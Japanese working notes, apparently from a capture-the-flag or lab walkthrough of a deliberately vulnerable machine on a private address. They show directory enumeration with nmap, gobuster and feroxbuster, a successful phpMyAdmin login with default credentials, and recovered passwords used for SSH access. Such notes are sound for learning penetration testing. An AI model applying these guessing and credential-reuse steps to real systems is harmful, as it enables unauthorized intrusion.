nmap -Pn -sV -sC -A -p80 192.168.0.116

![[Webの調査 image 42.png]]

gobuster dir -u http://192.168.0.116:80 -w /usr/share/dirb/wordlists/common.txt

![[Webの調査 image 43.png]]

/phpmyadmin   /phpinfo.php        /robots.txt

http://192.168.0.115

apacheのデフォルトページ

robots.txt

![[Webの調査 image 44.png]]

![[Webの調査 image 45.png]]

![[Webの調査 image 46.png]]

特に見つからないのでワードリストのサイズを上げて再度列挙

gobuster dir -u http://192.168.0.116 -w /usr/share/dirb/wordlists/big.txt

![[Webの調査 image 47.png]]

新たに/electionが判明

![[Webの調査 image 48.png]]

/election以下を深堀り

gobuster dir -u http://192.168.0.116/election -w /usr/share/dirb/wordlists/big.txt

![[Webの調査 image 49.png]]

![[Webの調査 image 50.png]]

idがわからないため再びphpmyadminを探索

root:toorで試行してみる

![[Webの調査 image 51.png]]

成功

![[Webの調査 image 52.png]]

id　1234

pw　bb113886b0513a9d882e3caa5cd73314

feroxbuster -u http://192.168.0.116/election -w /usr/share/dirb/wordlists/common.txt -g

/admin/logs

![[Webの調査 image 53.png]]

![[Webの調査 image 54.png]]

ID love

PW P@$$w0rd@123

ssh

![[Webの調査 image 55.png]]

成功